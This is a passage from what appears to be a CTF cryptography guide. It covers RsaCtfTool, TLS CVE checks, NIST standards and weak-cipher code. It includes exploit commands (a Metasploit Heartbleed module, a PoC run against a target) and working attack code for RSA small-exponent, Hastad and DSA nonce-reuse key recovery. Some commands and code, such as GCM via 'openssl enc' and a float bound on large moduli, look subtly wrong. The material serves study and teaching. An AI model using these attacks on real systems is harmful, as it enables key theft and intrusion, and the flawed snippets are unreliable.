- **Boneh-Durfee** - Lattice-based small d attack (d < n^0.292)
- **Hastad** - Low public exponent broadcast attack
- **Common modulus** - Two messages, same n, different e
- **Small e** - e=3 with small plaintext (m^3 < n)

Multi-key attacks:

- **Common prime** - Shared factors across multiple keys (GCD attack)
- **Past CTF** - Database of known challenge keys
- **Partial key recovery** - Known bits of p or q

Side-channel style:

- **Timing** - Not applicable to offline CTF scenarios
- **LSB oracle** - Requires decryption oracle (not automated)

**Advanced Usage Patterns:**

Multiple public keys (common prime attack):

```bash
# Automatically detects shared factors
python3 RsaCtfTool.py --publickey key1.pem key2.pem key3.pem --uncipherfile cipher.txt
```

Private key generation from factors:

```bash
# If you've manually found p and q
python3 RsaCtfTool.py --createprivate --p <p_value> --q <q_value>
```

Custom parameter input:

```bash
# Direct n, e, c values
python3 RsaCtfTool.py --n <modulus> --e <exponent> --uncipher <ciphertext_int>
```

Verbose output for debugging:

```bash
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt -v
# Shows which attacks are attempted and why they fail
```

**Practical CTF Scenarios:**

Scenario 1: Unknown weak modulus

```bash
python3 RsaCtfTool.py --publickey challenge.pem --uncipherfile flag.enc --attack all

# Tool automatically:
# 1. Checks FactorDB
# 2. Tries Fermat factorization
# 3. Tests Wiener attack
# 4. Attempts small prime factorization
```

Scenario 2: Multiple related ciphertexts

```bash
# Hastad's broadcast attack (same message, different keys, e=3)
python3 RsaCtfTool.py \
  --publickey key1.pem key2.pem key3.pem \
  --uncipherfile c1.txt c2.txt c3.txt \
  --attack hastads
```

Scenario 3: Common modulus attack

```bash
# Two ciphertexts, same n, coprime e1 and e2
python3 RsaCtfTool.py \
  --publickey pub1.pem pub2.pem \
  --uncipherfile cipher1.txt cipher2.txt \
  --attack common_modulus
```

**Custom Attack Integration:**

The tool is modular; custom attacks can be added:

```python
# attacks/custom_attack.py
class Attack:
    def __init__(self, attack_config):
        self.config = attack_config
    
    def attack(self, publickey, cipher):
        # Your custom attack logic
        # Return private key or plaintext if successful
        pass
    
    def test(self):
        # Test conditions for attack applicability
        pass
```

**Configuration Options:**

Timeout settings:

```bash
# Set per-attack timeout (seconds)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --timeout 300
```

Thread control:

```bash
# Parallel attack execution
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --threads 4
```

**Output Formats:**

```bash
# Hex output
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --output-format hex

# Raw binary
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --output plaintext.bin

# Automatic format detection (default)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt
```

**Limitations and Considerations:**

[Inference] RsaCtfTool effectiveness depends on:

- Attack implementation quality (varies by attack type)
- Available computational resources
- Specific parameter ranges of the challenge

[Unverified] Success rates by attack type:

- FactorDB lookup: High for CTF challenges (commonly seeded)
- Wiener attack: Moderate (requires d < n^0.25)
- Fermat: High if |p-q| < 10^6 or similar
- Small e: High if m^e < n

The tool does not guarantee success against:

- Strong, properly generated RSA keys (2048+ bit, random primes)
- Novel attack vectors not yet implemented
- Challenges requiring side-channel analysis

**Integration with Other Tools:**

Combining with manual analysis:

```bash
# 1. Try RsaCtfTool first
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt -v > analysis.log

# 2. If failed, extract n and e for manual work
openssl rsa -pubin -in pub.pem -text -noout

# 3. Manual FactorDB check
# Visit http://factordb.com/ with n value

# 4. Try specialized tools for specific attacks
# yafu, msieve for advanced factorization
```

SageMath integration for Boneh-Durfee:

```bash
# RsaCtfTool uses SageMath if available
# Install: apt install sagemath
# Tool automatically detects and uses for lattice attacks
```

### Important Tool Combinations for CTF Success

**Recommended Workflow:**

```
1. Initial Analysis:
   - CyberChef Magic → Identify encoding layers
   - Dcode.fr Cipher Identifier → Classify cipher type

2. Classical Ciphers:
   - Dcode.fr automated solvers
   - CyberChef for multi-stage decoding

3. RSA Challenges:
   - RsaCtfTool first attempt
   - FactorDB manual verification if tool fails
   - Custom scripts for novel attacks

4. Verification:
   - CyberChef for format conversion
   - Manual inspection of decoded output
```

These tools form the foundation of crypto CTF solving, but success often requires combining automated approaches with manual cryptanalysis and custom scripting.

---

# VULNERABILITY DATABASES & FRAMEWORKS

## Known Weaknesses

### CVE (Common Vulnerabilities and Exposures)

CVE is a standardized identifier system for publicly disclosed cybersecurity vulnerabilities, critical for identifying exploitable cryptographic weaknesses in CTF challenges.

#### CVE Identifier Format

```
CVE-YEAR-NUMBER
Example: CVE-2014-0160 (Heartbleed)
```

#### Major Cryptographic CVEs

**Heartbleed (CVE-2014-0160)**

bash

```bash
# OpenSSL TLS heartbeat extension vulnerability
# Affected: OpenSSL 1.0.1 through 1.0.1f

# Testing with Nmap
nmap -p 443 --script ssl-heartbleed target.ctf

# Metasploit module
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.ctf
set RPORT 443
run

# Manual exploitation (Python)
git clone https://github.com/sensepost/heartbleed-poc
python heartbleed-poc.py target.ctf -p 443
```

**POODLE (CVE-2014-3566)**

bash

```bash
# SSLv3 padding oracle vulnerability
# Affects: SSLv3 protocol

# Detection
nmap --script ssl-poodle -p 443 target.ctf

# OpenSSL testing
openssl s_client -connect target.ctf:443 -ssl3

# Exploitation requires MitM positioning
# Downgrade attack to force SSLv3
```

**DROWN (CVE-2016-0800)**

bash

```bash
# Cross-protocol attack on TLS using SSLv2
# Decrypting Reused Old Weakly encrypted Navigation

# Detection
nmap --script ssl-drown -p 443 target.ctf

# Check SSLv2 support
openssl s_client -connect target.ctf:443 -ssl2

# Requires SSLv2 enabled on server
# Captures TLS sessions, decrypts via SSLv2
```

**BEAST (CVE-2011-3389)**

bash

```bash
# Browser Exploit Against SSL/TLS
# Cipher Block Chaining (CBC) vulnerability in TLS 1.0

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "CBC"

# Identify TLS 1.0 with CBC ciphers
testssl.sh --beast target.ctf:443
```

**CRIME (CVE-2012-4929)**

bash

```bash
# Compression Ratio Info-leak Made Easy
# TLS compression side-channel attack

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf

# Check compression support
openssl s_client -connect target.ctf:443 | grep "Compression"

# testssl.sh check
testssl.sh --crime target.ctf:443
```

**BREACH (CVE-2013-3587)**

bash

```bash
# Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext
# HTTP compression attack (CRIME variant)

# No direct tool detection
# Manual analysis: Check HTTP responses for compression
curl -I https://target.ctf | grep "Content-Encoding"

# Exploitation requires:
# - HTTPS with HTTP compression
# - User input reflected in response
# - Secret in response body
```

**Logjam (CVE-2015-4000)**

bash

```bash
# Diffie-Hellman key exchange weakness
# Export-grade cipher downgrade attack

# Detection
nmap --script ssl-dh-params target.ctf

# Comprehensive check
testssl.sh --logjam target.ctf:443

# Check DH parameter size
openssl s_client -connect target.ctf:443 -cipher "EDH" | grep "Server Temp Key"
```

**FREAK (CVE-2015-0204)**

bash

```bash
# Factoring RSA Export Keys
# Forces use of weak export-grade RSA keys

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "EXPORT"

# OpenSSL check
openssl s_client -connect target.ctf:443 -cipher EXPORT

# testssl.sh
testssl.sh --freak target.ctf:443
```

**RC4 Cipher Vulnerabilities**

bash

```bash
# Multiple CVEs: CVE-2013-2566, CVE-2015-2808

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "RC4"

# testssl.sh check
testssl.sh --rc4 target.ctf:443

# OpenSSL enumeration
openssl ciphers -v | grep RC4
```

**ROBOT (CVE-2017-6168)**

bash

```bash
# Return Of Bleichenbacher's Oracle Threat
# RSA PKCS#1 v1.5 padding oracle

# Testing tool
git clone https://github.com/robotattackorg/robot-detect
cd robot-detect
python robot-detect.py target.ctf 443

# Requires multiple TLS connection attempts
# Analyzes error responses for padding oracle
```

#### CVE Database Searching

**Online Resources:**

bash

```bash
# CVE Search via command line
curl -s "https://cve.circl.lu/api/search/openssl" | jq .

# National Vulnerability Database API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=openssl"

# CVE Details website search
# https://www.cvedetails.com/
```

**Local CVE Database:**

bash

```bash
# Install CVE-Search
git clone https://github.com/cve-search/cve-search.git
cd cve-search
pip install -r requirements.txt
./sbin/db_mgmt.py -p
./sbin/db_updater.py -c

# Query local database
python bin/search.py -s openssl

# Web interface
./web/index.py
# Access: http://localhost:5000
```

### NVD (National Vulnerability Database)

NVD is the U.S. government repository of standards-based vulnerability management data, providing comprehensive CVE information with CVSS scoring.

#### NVD API Usage

**API v2.0 Access:**

bash

```bash
# Basic CVE lookup
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2014-0160" | jq .

# Search by keyword
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=heartbleed" | jq .

# Date range filtering
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=2020-01-01T00:00:00.000&pubEndDate=2020-12-31T23:59:59.999" | jq .

# CVSS v3 severity filtering
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cvssV3Severity=CRITICAL" | jq .
```

**Python NVD Integration:**

python

```python
import requests
import json

def query_nvd(cve_id):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        return data
    else:
        return None

# Example usage
cve_data = query_nvd("CVE-2014-0160")
print(json.dumps(cve_data, indent=2))
```

**CVSS Scoring Interpretation:**

```
CVSS v3.1 Score Ranges:
- None: 0.0
- Low: 0.1-3.9
- Medium: 4.0-6.9
- High: 7.0-8.9
- Critical: 9.0-10.0

# Automated scoring lookup
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2014-0160" | \
  jq '.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore'
```

#### NVD Search Strategies for CTF

**Cryptographic Library Search:**

bash

```bash
# OpenSSL vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=openssl&resultsPerPage=50" | \
  jq '.vulnerabilities[].cve.id'

# libgcrypt vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=libgcrypt" | \
  jq '.vulnerabilities[].cve.id'

# GnuTLS vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=gnutls" | \
  jq '.vulnerabilities[].cve.id'
```

**Protocol-Specific Search:**

bash

```bash
# TLS/SSL vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=TLS" | jq .

# SSH vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=SSH" | jq .

# IPSec vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=IPSec" | jq .
```

### NIST Cryptographic Standards

NIST (National Institute of Standards and Technology) publishes authoritative cryptographic standards used globally, with known deprecated algorithms frequently appearing in CTF challenges.

#### FIPS Publications

**FIPS 140-2/140-3:**

```
Cryptographic Module Validation Program
Defines security requirements for cryptographic modules

Levels:
1. Basic security requirements
2. Physical tamper-evidence
3. Tamper-resistant physical security
4. Complete envelope of protection

# Check if implementation is FIPS validated
openssl version
# Look for FIPS indicators

# Enable FIPS mode (if compiled with FIPS)
openssl fipsinstall -out /usr/local/ssl/fipsmodule.cnf -module /usr/local/lib/ossl-modules/fips.so
```

**FIPS 180-4 (Secure Hash Standard):**

bash

```bash
# Approved hash functions
# SHA-1 (deprecated for most uses)
# SHA-2 family: SHA-224, SHA-256, SHA-384, SHA-512
# SHA-3 family

# Generate hashes per FIPS 180-4
echo "test" | openssl dgst -sha256
echo "test" | openssl dgst -sha512
echo "test" | openssl dgst -sha3-256
```

**FIPS 186-4 (Digital Signature Standard):**

bash

```bash
# DSA key generation (per FIPS 186-4)
openssl dsaparam -out dsaparam.pem 2048
openssl gendsa -out dsa_key.pem dsaparam.pem

# RSA signatures (FIPS approved key sizes: 2048, 3072)
openssl genrsa -out rsa_key.pem 2048
openssl rsa -in rsa_key.pem -pubout -out rsa_pub.pem

# ECDSA (approved curves: P-256, P-384, P-521)
openssl ecparam -name prime256v1 -genkey -out ec_key.pem
```

**FIPS 197 (AES Standard):**

bash

```bash
# Advanced Encryption Standard
# Key sizes: 128, 192, 256 bits

# AES-256-CBC encryption
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.enc -k password

# AES-128-GCM (authenticated encryption)
openssl enc -aes-128-gcm -in plaintext.txt -out ciphertext.enc -k password

# AES-256-CTR
openssl enc -aes-256-ctr -in plaintext.txt -out ciphertext.enc -k password
```

#### SP 800 Series (Special Publications)

**SP 800-38 Series (Block Cipher Modes):**

bash

```bash
# SP 800-38A: ECB, CBC, CFB, OFB, CTR
# SP 800-38D: GCM (Galois/Counter Mode)
# SP 800-38F: Key Wrap

# CBC mode (requires IV)
openssl enc -aes-256-cbc -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>

# GCM mode (authenticated encryption)
openssl enc -aes-256-gcm -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>

# CTR mode
openssl enc -aes-256-ctr -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>
```

**SP 800-56 (Key Establishment):**

bash

```bash
# SP 800-56A: Diffie-Hellman and ECDH
# SP 800-56B: RSA key establishment

# Generate DH parameters (per SP 800-56A)
openssl dhparam -out dh2048.pem 2048

# ECDH key agreement (P-256 curve)
openssl ecparam -name prime256v1 -genkey -out alice_key.pem
openssl ecparam -name prime256v1 -genkey -out bob_key.pem

# Extract public keys
openssl ec -in alice_key.pem -pubout -out alice_pub.pem
openssl ec -in bob_key.pem -pubout -out bob_pub.pem
```

**SP 800-90 (Random Number Generation):**

bash

```bash
# SP 800-90A: DRBG specifications
# SP 800-90B: Entropy source requirements

# Linux CSPRNG (compliant implementation)
# /dev/random - blocking, high entropy
# /dev/urandom - non-blocking, suitable for crypto

# Generate random bytes
dd if=/dev/urandom of=random.bin bs=32 count=1

# OpenSSL random generation
openssl rand -hex 32
openssl rand -base64 32

# Check available entropy
cat /proc/sys/kernel/random/entropy_avail
```

**SP 800-132 (Password-Based Key Derivation):**

bash

```bash
# PBKDF2 specification

# Generate key from password using PBKDF2
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -in file.txt -out file.enc -k password

# Python implementation
python3 << EOF
from hashlib import pbkdf2_hmac
import binascii

password = b"password"
salt = b"salt1234"
iterations = 100000
key = pbkdf2_hmac('sha256', password, salt, iterations)
print(binascii.hexlify(key).decode())
EOF
```

#### Deprecated/Weak Standards (Common in CTF)

**MD5 (FIPS 180-1 - Deprecated):**

bash

```bash
# Known collision vulnerabilities
# Still found in legacy systems and CTF challenges

# Generate MD5 hash
echo "test" | md5sum
openssl dgst -md5 file.txt

# Collision generation tools
# HashClash for MD5 collisions
git clone https://github.com/cr-marcstevens/hashclash
```

**SHA-1 (FIPS 180-1 - Deprecated 2011):**

bash

```bash
# Collision attacks demonstrated (SHAttered, 2017)
# Deprecated for digital signatures

# Generate SHA-1 hash
echo "test" | sha1sum
openssl dgst -sha1 file.txt

# SHAttered collision detection
git clone https://github.com/nneonneo/sha1collider
python sha1collider.py file1.pdf file2.pdf
```

**DES/3DES (FIPS 46-3 - Withdrawn):**

bash

```bash
# DES: 56-bit key (insecure)
# 3DES: Being phased out

# DES encryption (educational only)
openssl enc -des -in plaintext.txt -out ciphertext.enc -k password

# 3DES encryption
openssl enc -des3 -in plaintext.txt -out ciphertext.enc -k password

# Brute force DES key (56-bit space)
# Modern hardware can crack in hours
```

**RSA < 2048 bits:**

bash

```bash
# NIST deprecated RSA-1024 after 2013
# RSA-2048 minimum for new applications

# Generate weak RSA key (CTF scenarios)
openssl genrsa -out weak_rsa.pem 512
openssl genrsa -out weak_rsa.pem 1024

# Factor small RSA keys
# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
python3 RsaCtfTool.py --publickey weak_pub.pem --private
```

**DSA with SHA-1:**

bash

```bash
# DSA signatures using SHA-1 deprecated
# Nonce reuse attacks possible

# Generate DSA with SHA-1 (legacy)
openssl dsaparam -out dsaparam.pem 1024
openssl gendsa -out dsa_key.pem dsaparam.pem

# Sign with DSA (vulnerable if nonce reused)
openssl dgst -sha1 -sign dsa_key.pem -out signature.bin message.txt
```

#### NIST Cryptographic Algorithm Validation Program (CAVP)

**Algorithm Testing:**

bash

```bash
# CAVP validates cryptographic implementations
# Test vectors available for validation

# AES test vectors
wget https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Algorithm-Validation-Program/documents/aes/AESAVS.pdf

# SHA test vectors
wget https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Algorithm-Validation-Program/documents/shs/SHAVS.pdf
```

**Python NIST Test Vector Validation:**

python

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import binascii

# AES-128 ECB test vector (NIST FIPS 197)
key = binascii.unhexlify('2b7e151628aed2a6abf7158809cf4f3c')
plaintext = binascii.unhexlify('6bc1bee22e409f96e93d7e117393172a')
expected = binascii.unhexlify('3ad77bb40d7a3660a89ecaf32466ef97')

cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)

assert ciphertext == expected, "AES test vector failed"
print("AES-128 ECB test vector: PASS")
```

### CTF-Specific Vulnerability Identification

**Challenge Reconnaissance:**

bash

```bash
# Identify cryptographic library versions
strings binary | grep -i "openssl"
strings binary | grep -i "libcrypto"

# Check linked libraries
ldd binary | grep crypto

# Identify weak ciphers in network services
nmap --script ssl-enum-ciphers -p 443 target.ctf

# Enumerate supported protocols
sslscan target.ctf:443
testssl.sh target.ctf:443
```

**Automated Vulnerability Scanning:**

bash

```bash
# Nmap NSE scripts for crypto vulnerabilities
nmap --script ssl-* -p 443 target.ctf

# Specific vulnerability checks
nmap --script ssl-heartbleed,ssl-poodle,ssl-dh-params target.ctf

# Cipher suite enumeration
nmap --script ssl-enum-ciphers target.ctf
```

**Manual Protocol Analysis:**

bash

```bash
# Capture TLS handshake
tcpdump -i eth0 -w capture.pcap port 443

# Analyze with Wireshark
wireshark capture.pcap
# Filter: ssl.handshake || tls.handshake

# Extract cipher suites from handshake
tshark -r capture.pcap -Y "ssl.handshake.type == 2" -T fields -e ssl.handshake.ciphersuite
```

### Important Subtopics

Consider exploring these related areas for comprehensive cryptographic vulnerability assessment:

- **Padding Oracle Attacks** - Practical exploitation of CBC padding validation
- **Timing Attacks** - Side-channel analysis of cryptographic operations
- **Weak Random Number Generation** - PRNG predictability and exploitation
- **Implementation Flaws** - Bugs in cryptographic library implementations (e.g., OpenSSL timing leaks, Debian weak keys)

---

## Weak Cipher Collections

### Deprecated Algorithms Registry

#### Symmetric Ciphers - Broken/Deprecated

**DES (Data Encryption Standard)**

```python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad

# DES parameters
KEY_SIZE = 8  # 56 bits + 8 parity bits
BLOCK_SIZE = 8

# Basic DES implementation
def des_encrypt(plaintext, key):
    cipher = DES.new(key, DES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, BLOCK_SIZE))

def des_decrypt(ciphertext, key):
    cipher = DES.new(key, DES.MODE_ECB)
    return unpad(cipher.decrypt(ciphertext), BLOCK_SIZE)

# Brute force attack on DES
def des_bruteforce(ciphertext, known_plaintext):
    """
    [Inference] Practical on modern hardware in hours/days
    DES keyspace: 2^56 keys
    """
    from itertools import product
    
    known_plaintext_padded = pad(known_plaintext, BLOCK_SIZE)
    
    # Example partial brute force (demo only - full search requires distributed computing)
    for key_int in range(0, 1000000):  # Truncated for demonstration
        key = key_int.to_bytes(8, 'big')
        try:
            cipher = DES.new(key, DES.MODE_ECB)
            test_ct = cipher.encrypt(known_plaintext_padded)
            if test_ct == ciphertext[:len(test_ct)]:
                return key
        except:
            continue
    return None

# Weak DES keys (8 known weak keys)
WEAK_DES_KEYS = [
    b'\x01\x01\x01\x01\x01\x01\x01\x01',
    b'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',
    b'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',
    b'\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E',
    b'\x01\xFE\x01\xFE\x01\xFE\x01\xFE',
    b'\xFE\x01\xFE\x01\xFE\x01\xFE\x01',
    b'\xE0\xF1\xE0\xF1\xF1\xE0\xF1\xE0',
    b'\x1F\x0E\x1F\x0E\x0E\x1F\x0E\x1F'
]

def check_weak_des_key(key):
    return key in WEAK_DES_KEYS
```

**3DES (Triple DES) - Deprecated**

```python
from Crypto.Cipher import DES3

# 3DES key sizes: 16 bytes (2-key) or 24 bytes (3-key)
def triple_des_operations(plaintext, key):
    """
    3DES deprecated due to 64-bit block size (Sweet32 attack)
    """
    # Ensure key is 16 or 24 bytes
    if len(key) not in [16, 24]:
        raise ValueError("3DES key must be 16 or 24 bytes")
    
    cipher = DES3.new(key, DES3.MODE_CBC)
    iv = cipher.iv
    ciphertext = cipher.encrypt(pad(plaintext, DES3.block_size))
    
    return ciphertext, iv

# Sweet32 birthday attack considerations
# [Inference] Practical after 2^32 blocks (~32GB) with same key
def detect_sweet32_vulnerability(block_count):
    SAFE_BLOCK_LIMIT = 2**32
    if block_count > SAFE_BLOCK_LIMIT:
        return True, "Sweet32 attack feasible"
    return False, "Below Sweet32 threshold"
```

**RC4 (Rivest Cipher 4)**

```python
# RC4 implementation (for CTF analysis)
class RC4:
    def __init__(self, key):
        self.key = key
        self.S = list(range(256))
        self._ksa()
    
    def _ksa(self):
        """Key Scheduling Algorithm"""
        j = 0
        for i in range(256):
            j = (j + self.S[i] + self.key[i % len(self.key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
    
    def _prga(self):
        """Pseudo-Random Generation Algorithm"""
        i = j = 0
        while True:
            i = (i + 1) % 256
            j = (j + self.S[i]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
            K = self.S[(self.S[i] + self.S[j]) % 256]
            yield K
    
    def encrypt(self, plaintext):
        keystream = self._prga()
        return bytes([p ^ next(keystream) for p in plaintext])
    
    decrypt = encrypt  # RC4 is symmetric

# Known RC4 weaknesses
def rc4_weak_key_attack(ciphertext):
    """
    First bytes of keystream have statistical bias
    """
    # Invariance weakness: certain key bytes reveal keystream bytes
    weak_positions = [0, 1, 2, 255]
    return weak_positions

# RC4 bias in initial keystream bytes
def rc4_initial_byte_bias():
    """
    [Inference] Statistical bias in first 256 bytes
    P(second_byte = 0) ≈ 1/128 instead of 1/256
    """
    return {
        'byte_position': 1,
        'expected_value': 0,
        'probability': 1/128,
        'normal_probability': 1/256
    }
```

**Blowfish (Weak for Small Block Size)**

```python
from Crypto.Cipher import Blowfish

# Blowfish: 64-bit blocks (vulnerable to birthday attacks)
def blowfish_operations(plaintext, key):
    """
    Deprecated due to 64-bit block size
    Vulnerable to Sweet32 like 3DES
    """
    cipher = Blowfish.new(key, Blowfish.MODE_CBC)
    iv = cipher.iv
    ciphertext = cipher.encrypt(pad(plaintext, Blowfish.block_size))
    return ciphertext, iv

# Blowfish weak keys (known key classes)
def check_blowfish_weak_keys(key):
    """
    [Unverified] Specific weak key classes reported but not comprehensively documented
    """
    # Check for all-zero or all-one patterns
    if key == b'\x00' * len(key) or key == b'\xff' * len(key):
        return True, "All-zeros or all-ones key"
    return False, "No obvious weakness"
```

**MD5 (Message Digest 5)**

```bash
# MD5 collision generation using HashClash
git clone https://github.com/cr-marcstevens/hashclash.git
cd hashclash
make

# Generate MD5 collision
./md5_fastcoll -p prefix.bin -o collision1.bin collision2.bin

# Verify collision
md5sum collision1.bin collision2.bin
```

```python
import hashlib

def md5_collision_demo():
    """
    Known MD5 collision pairs (discovered 2004)
    """
    # Famous collision pair (hex representation)
    block1 = bytes.fromhex(
        "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89"
        "55ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5b"
        "d8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0"
        "e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
    )
    
    block2 = bytes.fromhex(
        "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89"
        "55ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5b"
        "d8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0"
        "e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"
    )
    
    hash1 = hashlib.md5(block1).hexdigest()
    hash2 = hashlib.md5(block2).hexdigest()
    
    print(f"Block 1 MD5: {hash1}")
    print(f"Block 2 MD5: {hash2}")
    print(f"Collision: {hash1 == hash2}")
    print(f"Identical: {block1 == block2}")

# MD5 length extension attack
def md5_length_extension(original_hash, original_length, append_data):
    """
    MD5 is vulnerable to length extension attacks
    """
    import struct
    
    # Calculate padding for original message
    ml = original_length * 8
    padding_length = (55 - original_length) % 64
    padding = b'\x80' + (b'\x00' * padding_length) + struct.pack('<Q', ml)
    
    # New message = original + padding + appended data
    # [Inference] Hash state can be continued from original hash
    return padding + append_data
```

**SHA-1 (Secure Hash Algorithm 1)**

```bash
# SHA-1 collision attack using sha1collisiondetection
git clone https://github.com/cr-marcstevens/sha1collisiondetection.git
cd sha1collisiondetection
make

# Check if file uses SHA-1 collision
./sha1dcsum file.bin
```

```python
import hashlib

def sha1_weakness_check():
    """
    SHA-1 broken in 2017 (SHAttered attack)
    First collision found by Google
    """
    # Known collision: shattered-1.pdf and shattered-2.pdf
    # Collision requires ~2^63.1 operations (practical with resources)
    
    return {
        'status': 'BROKEN',
        'collision_complexity': '2^63.1 operations',
        'year_broken': 2017,
        'attack_name': 'SHAttered'
    }

def sha1_vs_sha256_comparison(data):
    """
    Demonstrate migration from SHA-1 to SHA-256
    """
    sha1_hash = hashlib.sha1(data).hexdigest()
    sha256_hash = hashlib.sha256(data).hexdigest()
    
    return {
        'sha1': sha1_hash,
        'sha1_status': 'DEPRECATED',
        'sha256': sha256_hash,
        'sha256_status': 'SECURE'
    }
```

#### Asymmetric Ciphers - Weak Implementations

**RSA with Small Exponents**

```python
from Crypto.Util.number import long_to_bytes, GCD
import gmpy2

def small_e_attack(n, e, c):
    """
    When e=3 and message^3 < n, direct root extraction works
    """
    if e == 3:
        # Try direct cube root
        m = gmpy2.iroot(c, 3)
        if m[1]:  # Perfect cube
            return long_to_bytes(m[0])
    
    # Extended attack: message^e < k*n for small k
    for k in range(1, 1000):
        m = gmpy2.iroot(c + k * n, e)
        if m[1]:
            plaintext = long_to_bytes(m[0])
            # Verify
            if pow(int.from_bytes(plaintext, 'big'), e, n) == c:
                return plaintext
    
    return None

# Håstad's broadcast attack (same message, multiple recipients)
def hastad_broadcast_attack(ciphertexts, moduli, e=3):
    """
    When same message sent to e recipients with e=3
    Uses Chinese Remainder Theorem
    """
    from functools import reduce
    
    def chinese_remainder_theorem(remainders, moduli):
        total = 0
        prod = reduce(lambda a, b: a * b, moduli)
        for r, m in zip(remainders, moduli):
            p = prod // m
            total += r * pow(p, -1, m) * p
        return total % prod
    
    if len(ciphertexts) < e:
        return None
    
    # Apply CRT
    c_combined = chinese_remainder_theorem(ciphertexts[:e], moduli[:e])
    
    # Extract eth root
    m = gmpy2.iroot(c_combined, e)
    if m[1]:
        return long_to_bytes(m[0])
    
    return None
```

**Weak RSA Key Generation**

```python
import random
from Crypto.Util.number import getPrime, isPrime

def detect_weak_rsa_key(n, e, d=None):
    """
    Detect various RSA weaknesses
    """
    vulnerabilities = []
    
    # Check exponent size
    if e < 65537:
        vulnerabilities.append(('WEAK_EXPONENT', f'e={e} is too small'))
    
    # Check for small factors
    small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
    for p in small_primes:
        if n % p == 0:
            vulnerabilities.append(('SMALL_FACTOR', f'n divisible by {p}'))
    
    # Check modulus size
    bit_length = n.bit_length()
    if bit_length < 2048:
        vulnerabilities.append(('SHORT_MODULUS', f'{bit_length} bits < 2048'))
    
    # Check for Wiener's attack conditions
    if d is not None and d < (n ** 0.25) / 3:
        vulnerabilities.append(('WIENER_VULNERABLE', 'd is too small'))
    
    # Check if n is even
    if n % 2 == 0:
        vulnerabilities.append(('EVEN_MODULUS', 'n is even'))
    
    return vulnerabilities

# Common modulus attack detection
def detect_common_modulus(key_pairs):
    """
    Check if multiple keys share the same modulus
    """
    moduli = {}
    for i, (n, e) in enumerate(key_pairs):
        if n in moduli:
            return True, f"Keys {moduli[n]} and {i} share modulus"
        moduli[n] = i
    return False, "No common moduli found"
```

**DSA with Weak Parameters**

```python
from Crypto.PublicKey import DSA
from Crypto.Random import random
import hashlib

def dsa_nonce_reuse_attack(msg1, sig1, msg2, sig2, q, g, y):
    """
    Extract private key when nonce k is reused
    r1, s1 = sig1
    r2, s2 = sig2
    
    If k is reused: r1 == r2
    Then: k = (H(m1) - H(m2)) / (s1 - s2) mod q
          x = (s*k - H(m)) / r mod q
    """
    r1, s1 = sig1
    r2, s2 = sig2
    
    if r1 != r2:
        return None, "No nonce reuse detected"
    
    # Calculate message hashes
    h1 = int(hashlib.sha1(msg1).hexdigest(), 16)
    h2 = int(hashlib.sha1(msg2).hexdigest(), 16)
    
    # Recover nonce k
    k = ((h1 - h2) * pow(s1 - s2, -1, q)) % q
    
    # Recover private key x
    x = ((s1 * k - h1) * pow(r1, -1, q)) % q
    
    return x, "Private key recovered"

def dsa_weak_parameters_check(p, q, g):
    """
    Check DSA parameters for known weaknesses
    """
